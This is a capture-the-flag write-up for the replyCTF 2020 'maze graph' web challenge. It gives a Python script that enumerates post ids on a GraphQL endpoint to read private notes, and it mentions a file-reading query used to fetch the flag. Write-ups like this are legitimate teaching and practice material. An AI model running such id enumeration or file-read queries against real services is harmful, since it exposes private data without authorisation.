---
layout: post
category: web
title: replyCTF 2020 - maze graph
tags: 
    - rixxc
---

# Overview

The task provides us with a graphql endpoint.

# Exploit

The API provided us with a way to list public posts and a way to list posts by id. This could be used to access private notes by enumerating all ids.

```python
from gql import gql, Client, AIOHTTPTransport

transport = AIOHTTPTransport(url="http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql")


client = Client(transport=transport, fetch_schema_from_transport=True)

query = gql(
    """
    query {
  allPublicPosts{
    id
  }
}
"""
)

result = client.execute(query)

ids = list(map(lambda x: int(x['id']) ,result['allPublicPosts']))
print(ids)

for i in range(1,251):
    if i not in ids:
        query2 = gql(
            f"""
            query {{
            post(id: {i}) {{
                id,
                content,
                public
                }}
                }}
            """
        )
        result = client.execute(query2)
        #print(i)
        #print(result)
        if 'delete' in result['post']['content']:
            print(result)
```

One of the private notes contains a message with a hint to delete a specific file.

Another graphql query (getAssets) allowed to access files on the filesystem. This could be used to access the file and obtain the flag.
